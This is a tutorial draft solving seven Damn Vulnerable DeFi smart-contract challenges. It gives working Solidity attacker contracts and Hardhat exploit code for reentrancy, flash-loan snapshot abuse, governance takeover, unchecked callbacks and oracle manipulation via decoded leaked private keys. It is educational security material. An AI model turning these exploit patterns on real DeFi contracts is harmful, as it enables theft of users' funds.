---
title: Damn Vulnerable DeFi solutions
date: '2022-12-02'
tags: ['challenges', 'solidity', 'defi', 'security']
draft: true
summary: 'A complete guide on solving Damn Vulnerable DeFi with detailed explanations for each challenge.'
---

# Introduction

[Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/) (DVD) is one of the most known sets of solidity challenges. The creator [@tinchoabbate](https://twitter.com/tinchoabbate) describes it as a wargame to learn the offensive security of DeFi smart contracts.

## Recommendation

1. If you are new to solidity or you are new to smart contracts security, I would recommend first starting with solving [Ethernaut](https://ethernaut.openzeppelin.com/) from [OpenZeppelin](https://openzeppelin.com/). Ethernaut is a set of challenges that focus on teaching solidity basics, alongside some challenges based on DeFi attacks and other real-world attacks.

2. Carefully read the description of each challenge. Those couple of lines can hide a lot of hints! Remember, in the real world; you don't get hints. Real-world projects are usually well-documented. Consider these texts a mix of documentation and an insight into attackers' minds.

3. Carefully read the test setups.

4. Reading imported contracts is very important. Especially contracts that keep reappearing. Most frequently used contracts come from [OpenZeppelin](https://openzeppelin.com/)'s library, which is ATTOW, the industry standard.

5. Take your time. Try and solve the challenges yourself before looking into the solutions. Even if you don't find a vulnerability, understanding each challenge's mechanism will help you improve your skills.

# Challenges

## Challenge #1 - Unstoppable

In hindsight, the title is already enough to know where this is going. In this challenge, you must find a way to stop the pool from working. Stopping a program from working is also known as a [DoS attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).
It is a prevalent vulnerability where an attacker manipulates a system in a way that will make it stop working. Thus Denial of Service.

In the [`flashLoan`](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/3e2a3675f4a733557ee9417b97fee104c0110618/contracts/unstoppable/UnstoppableLender.sol#L33-L48) function on [line 40](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/unstoppable/UnstoppableLender.sol#L40) the pool is checking [`assert(poolBalance == balanceBefore);`](<(https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/unstoppable/UnstoppableLender.sol#L40)>). The pool is using the variable `poolBalance` as accounting to store its token balance. If we transfer a minimum amount of 1 token to the pool, the actual balance and the balance stored in `poolBalance` will differ.

### Solution

Transfer 1 (or more) token(s) to the pool to complete the DoS attack:

```js:test/unstoppable/unstoppable.challenge.js
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        await this.token.connect(attacker).transfer(this.pool.address, 1);
    });
```

## Challenge #2 - Naive receiver

[`NaiveReceiverLenderPool.flashLoan`](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/3e2a3675f4a733557ee9417b97fee104c0110618/contracts/naive-receiver/NaiveReceiverLenderPool.sol#L21-L41) receives two arguments here. The first is the borrower's address, and the second is the amount to borrow. Since the `flashLoan` function is not checking whether the `borrower` is the `msg.sender`, we can trick the function by passing the address of the `FlashLoanReceiver` as the borrower's address. The pool asks for a `1 ether` fee for each executed `flashLoan`. We will have to keep executing the `flashLoan` function so often until the `FlashLoanreceiver`'s balance is drained by paying the fees each time.

### Solution

We will have to create a contract to execute the attack in one transaction. Inside our `attack` function, we will keep calling `flashLoan` with the receiver's address as long the receiver's balance is greater than or equal to the pool's fee:

```sol:contracts/attacker-contracts/naive-receiver/NaiveReceiverAttacker.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../../naive-receiver/FlashLoanReceiver.sol";
import "../../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttacker {
    function attack(address receiver, NaiveReceiverLenderPool pool) external {
        while (receiver.balance >= pool.fixedFee()) {
            pool.flashLoan(receiver, 0);
        }
    }
}
```

Now we only have to deploy our contract and call our `attack` function:

```js:test/naive-receiver/naive-receiver.challenge.js
    /** CODE YOUR EXPLOIT HERE */
    const NaiveReceiverAttackerFactory = await ethers.getContractFactory('NaiveReceiverAttacker', attacker);
    const naiveReceiverAttacker = await NaiveReceiverAttackerFactory.deploy();
    await naiveReceiverAttacker.attack(this.receiver.address, this.pool.address);
```

## Challenge #3 - Truster

Callback functions are the heart of flash loans. But they can also be a huge vulnerability. Calling external code is always dangerous, especially if the code is **untrusted**. Luckily in our case [`flashLoan`](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/3e2a3675f4a733557ee9417b97fee104c0110618/contracts/truster/TrusterLenderPool.sol#L23-L40) accepts a `target` address, usually a contract, and `call data` that allows us to execute any function on the target address.

### Solution

Again we need to create a contract to execute this action in one transaction:

```sol:contracts/attacker-contracts/truster/TrusterAttacker.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../../truster/TrusterLenderPool.sol";

contract TrusterAttacker {
    IERC20 private immutable damnValuableToken;
    TrusterLenderPool private immutable pool;

    constructor(IERC20 tokenAddress, TrusterLenderPool poolAddress) {
        damnValuableToken = tokenAddress;
        pool = poolAddress;
    }
    function attack(address attacker) external {
        // make the pool approve its balance to this contract's address
        uint256 amount = damnValuableToken.balanceOf(address(pool));
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
        pool.flashLoan(0, address(this), address(damnValuableToken), data);

        // transfer the tokens to our EOA
        damnValuableToken.transferFrom(address(pool), attacker, amount);
    }
}
```

Deploy and execute `attack`:

```js:test/truster/truster.challenge.js
    /** CODE YOUR EXPLOIT HERE  */
    const TrusterAttackerFactory = await ethers.getContractFactory('TrusterAttacker', attacker);
    const trusterAttacker = await TrusterAttackerFactory.deploy(this.token.address, this.pool.address);
    await trusterAttacker.attack(attacker.address);
```

## Challenge #4 - Side entrance

If you have ever googled "list of smart contract vulnerabilities", there is a high chance that you have already encountered reentrancy attacks. If you are not familiar with reentrancy attacks yet, I highly recommend you read this [article on hackernoon](https://hackernoon.com/hack-solidity-reentrancy-attack) from [@kamilpolak](https://hackernoon.com/u/kamilpolak).

The catch here is that [`flashLoan`](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/3e2a3675f4a733557ee9417b97fee104c0110618/contracts/side-entrance/SideEntranceLenderPool.sol#L29-L37) doesn't include a reentrancy guard.

### Solution

In our first call, we will borrow the total amount of ETH in the contract, then on [line 33](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/3e2a3675f4a733557ee9417b97fee104c0110618/contracts/side-entrance/SideEntranceLenderPool.sol#L33) our contract's `execute` function is called, which will again call `flashLoan`, but this time is requesting 0 ETH.

Create the following contract:

```sol:contracts/attacker-contracts/side-entrance/SideEntranceAttacker.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address payable attacker;

    constructor(SideEntranceLenderPool poolAddress, address payable attackerAddress) {
        pool = poolAddress;
        attacker = attackerAddress;
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
    }

    // callback function called in SideEntranceLenderPool.flashLoan
    function execute() external override payable {
        if (msg.value > 0) {
            pool.deposit{value: msg.value}();
            pool.flashLoan(0);
        }
    }

    receive() external payable {
        // transfer received ETH to our EOA
        (bool success,) = attacker.call{value: msg.value}("");
        require(success, "Error while transferring ETH");
    }
}
```

Here is what is happening in the second call:

1. `address(this).balance` will now return `0`, and `amount` is also `0`. So the `require` condition on [line 31](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/3e2a3675f4a733557ee9417b97fee104c0110618/contracts/side-entrance/SideEntranceLenderPool.sol#L31) will also pass.

```sol:contracts/side-entrance/SideEntranceLenderPool.sol#L30-L31
    uint256 balanceBefore = address(this).balance;
    require(balanceBefore >= amount, "Not enough ETH in balance");
```

2. Now on [line 33](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/3e2a3675f4a733557ee9417b97fee104c0110618/contracts/side-entrance/SideEntranceLenderPool.sol#L33) `IFlashLoanEtherReceiver.execute` is called again, but this time with an amount of 0 ETH. This means the `execute` function will be skipped in our contract. I.e. to [line 31](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/3e2a3675f4a733557ee9417b97fee104c0110618/contracts/side-entrance/SideEntranceLenderPool.sol#L31), [line 35](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/3e2a3675f4a733557ee9417b97fee104c0110618/contracts/side-entrance/SideEntranceLenderPool.sol#L35) will also pass now.

3. After the `pool.flashLoan` is finished executing, we call `pool.withdraw`. We must implement a `receive` function that will transfer the received amount to our EOA.

You guessed it, deploy and attack!

```js:test/side-entrance/side-entrance.challenge.js
    /** CODE YOUR EXPLOIT HERE */
    const SideEntranceAttackerFactory = await ethers.getContractFactory('SideEntranceAttacker', attacker);
    const sideEntranceAttacker = await SideEntranceAttackerFactory.deploy(this.pool.address, attacker.address);
    await sideEntranceAttacker.attack();
```

## Challenge #5 - The rewarder

So far, so good. Now the challenges are becoming more complicated.

> As a general rule, if some logic relies on a single snapshot in time instead of continuous/aggregated data points, it can be manipulated by flash loans

This quote is from [@cmichel's DVD solutions](https://cmichel.io/damn-vulnerable-de-fi-solutions/). I recommend reading his post if you want a slightly different perspective. I also highly recommend reading his other blog posts too.

Even if you are not aware of this vulnerability, most of the time, it is a good practice to reverse engineer a problem.

Starting from the bottom, what do we need?

### Solution

1. Claim the most rewards in the upcoming round. The only line that transfers rewards tokens is [line 79 in TheRewarderPool](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/3e2a3675f4a733557ee9417b97fee104c0110618/contracts/the-rewarder/TheRewarderPool.sol#L79)

```sol:contracts/the-rewarder/TheRewarderPool.sol#L79
    rewardToken.mint(msg.sender, rewards);
```

2. For that to happen, we must pass [line 78](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/3e2a3675f4a733557ee9417b97fee104c0110618/contracts/the-rewarder/TheRewarderPool.sol#L78)

```sol:contracts/the-rewarder/TheRewarderPool.sol#L78
    if(rewards > 0 && !_hasRetrievedReward(msg.sender))
```

`!_hasRetrievedReward(msg.sender)` already returns `true`, `rewards > 0` is returning `false`. All we need to do now is take a huge flash loan, `deposit` liquidity that will create a snapshot of the current balances state. But first don't forget to `appove` the amount of tokens to deposit to `TheRewarderPool`.

3. Now `withdaw` the deposited tokens and transfer them to `TheFlashLoanerPool` to complete the flash loan.

4. After receiving the reward tokens, transfer them to our EOA.

Here's how our code should look like:

```sol:contracts/attacker-contracts/the-rewarder/RewardAttacker.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../../the-rewarder/FlashLoanerPool.sol";
import "../../the-rewarder/RewardToken.sol";
import "../../the-rewarder/TheRewarderPool.sol";

contract RewardAttacker {
    FlashLoanerPool flashLoanerPool;
    RewardToken rewardToken;
    TheRewarderPool theRewarderPool;
    DamnValuableToken liquidityToken;

    constructor(
        FlashLoanerPool flashLoanerPoolAddress,
        RewardToken rewardTokenAddress,
        TheRewarderPool theRewarderPoolAddress,
        DamnValuableToken liquidityTokenAddress
    ) {
        flashLoanerPool = flashLoanerPoolAddress;
        rewardToken = rewardTokenAddress;
        theRewarderPool = theRewarderPoolAddress;
        liquidityToken = liquidityTokenAddress;

    }

    function attack(uint256 amount) external {
        // take flash loan from flash loaner pool
        flashLoanerPool.flashLoan(amount);
    }

    // called from FlashLoanerPool.flashLoan
    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(flashLoanerPool), "msg.sender must be pool");

        // deposit in rewarder pool
        liquidityToken.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);

        // withdraw amount to repay loan
        theRewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);

        // transfer tokens to attacker
        rewardToken.transfer(
            tx.origin,
            rewardToken.balanceOf(address(this))
        );
    }
}
```

Instead of running a local blockchain and wait 5 days, we can use the `evm_increaseTime` rpc method to increase the time for the next block. This only works for some local nodes. Read the [hardhat references docs](https://hardhat.org/hardhat-network/docs/reference). Now that you know, deploy + attack:

```js:test/the-rewarder/the-rewarder.challenge.js
    /** CODE YOUR EXPLOIT HERE */
    const RewardAttackerFactory = await ethers.getContractFactory('RewardAttacker', attacker);
    const rewardAttacker = await RewardAttackerFactory.deploy(
        this.flashLoanPool.address,
        this.rewardToken.address,
        this.rewarderPool.address,
        this.liquidityToken.address
    );

    // Advance time 5 days so that depositors can get rewards
    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days

    await rewardAttacker.attack(TOKENS_IN_LENDER_POOL);
```

## Challenge #6 - Selfie

Again, we have a snapshot token. This time, we want to attack the contract that governs the pool. The `SimpleGovernance` allows anyone to queue an action as long as they have enough votes. We can take advantage of the `SelfiePool.flashLoan` to get as much governance tokens as we can to queue an action to the `SimpleGovernance.actions`. Anyone can then execute the queued action after 2 days.

### Solution

Our contract should look like this:

```sol:contracts/attacker-contracts/selfie/SelfieAttacker.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../selfie/SelfiePool.sol";
import "../../selfie/SimpleGovernance.sol";
import "../../DamnValuableTokenSnapshot.sol";

contract SelfieAttacker {
    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;
    address attacker;

    constructor(SelfiePool selfiePoolAddress, SimpleGovernance simpleGovernanceAddress, address attackerAddress) {
        selfiePool = selfiePoolAddress;
        simpleGovernance = simpleGovernanceAddress;
        attacker = attackerAddress;
    }

    function attack(uint256 amount) external {
        // take a flash loan from the selfie pool
        selfiePool.flashLoan(amount);
    }

    function receiveTokens(DamnValuableTokenSnapshot governanceToken, uint256 amount) external {
        // selfie time
        governanceToken.snapshot();

        // queue action
        bytes memory data = abi.encodeWithSignature(
                "drainAllFunds(address)",
                attacker
            );

        simpleGovernance.queueAction(address(selfiePool), data, 0);

        bool success = governanceToken.transfer(address(selfiePool), amount);
        require(success, "token transfer failed");
    }
}
```

This time, we have to make two transactions. The first will queue the action to drain the funds and then wait two days; the second will execute the queued action. Deploy, wait, and then attack:

```js:test/selfie/selfie.challenge.js
    /** CODE YOUR EXPLOIT HERE */
    const SelfieAttackerFactory = await ethers.getContractFactory('SelfieAttacker', attacker);
    const selfieAttacker = await SelfieAttackerFactory.deploy(this.pool.address, this.governance.address, attacker.address);
    await selfieAttacker.attack(TOKENS_IN_POOL);

    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // wait 2 days

    // assuming action ID is 1 because no other actions were queued here before
    // in a real-life event, this value can be read from the blockchain
    await this.governance.executeAction(1);
```

## Challenge #7 - Compromised

This one is a bit different. Although the title itself is a big hint. We say a private key is compromised, when an unauthorized entity determines what the private key is. The server response is returning a sequence of bytes. In JavaScript this can be represented by a [Buffer](https://nodejs.org/api/buffer.html#buffer). The only way to tackle this challenge is to guess. We can try to manipulate the data and hope to get something interesting.

### Solution

We have two lines of bytes sequences. Let's decode them:<br/>

```
First sequence: 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

Second sequence: 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
```

After decoding it we get this string:<br/>

```
First hex: MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
Second hex: MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
```

This looks like a base64 string. Let's decode it again. We get this:<br/>

```
First private key: 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
Second private key: 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
```

No we have 2 64 hex characters strings (excluding the `0x`) which means we have 32 bytes strings. An ethereum private key has the length of 32 bytes. To [create an account](https://ethereum.org/en/developers/docs/accounts/#account-creation), the public key (account's address) is generated from the private key using the Elliptic Curve Digital Signature Algorithm, also known as `secp256k1` curve. You get a public address for your account by taking the last 20 bytes of the `keccak256` hash of the public key and adding `0x` to the beginning.

Ethers allows us to create a wallet by giving it a private key (optionally add a provider to enable making transactions). The generated public keys are the following:

```
First public key: 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
Second public key: 0x81A5D6E50C214044bE44cA0CB057fe119097850c
```

Now we have two of the three trusted reporters. This means we override the NFT price. Here's the code:

```js:test/compromised/compromised.challenge.js
    /** CODE YOUR EXPLOIT HERE */
    const serverResponse = [
        "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35",
        "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34"
    ];

    // get wallets
    const compromisedWallets = [];
    for (let i = 0; i < serverResponse.length; i++) {
        const res = serverResponse[i];
        const sanitizedResponse = res.replaceAll(" ", "");
        const encodedPrivateKeyAsBytes64 = Buffer.from(sanitizedResponse, `hex`).toString(`utf8`);
        const privateKey = Buffer.from(encodedPrivateKeyAsBytes64, `base64`).toString(`utf8`);
        compromisedWallets.push(new ethers.Wallet(privateKey, ethers.provider));

        // reduce price to 0 because exchange pays back the price difference, so we can maximize our profits
        await this.oracle.connect(compromisedWallets[i])
                        .postPrice("DVNFT", 0);
    }

    // buy a DVNFT, pay more than 0 because exchange does not accept a payment of 0 ETH
    await this.exchange.connect(attacker).buyOne({value: ethers.utils.parseEther("0.01")});

    // change price to initial exchange balance to drain its funds
    for (let i = 0; i < compromisedWallets.length; i++) {
        await this.oracle.connect(compromisedWallets[i])
                        .postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
    }

    // sell the DVNFT
    const tokenId = 0;
    await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId);
    await this.exchange.connect(attacker).sellOne(tokenId);

    // change price to initial NFT price to pass the last test check
    for (let i = 0; i < compromisedWallets.length; i++) {
        await this.oracle.connect(compromisedWallets[i])
                        .postPrice("DVNFT", INITIAL_NFT_PRICE);
    }
```
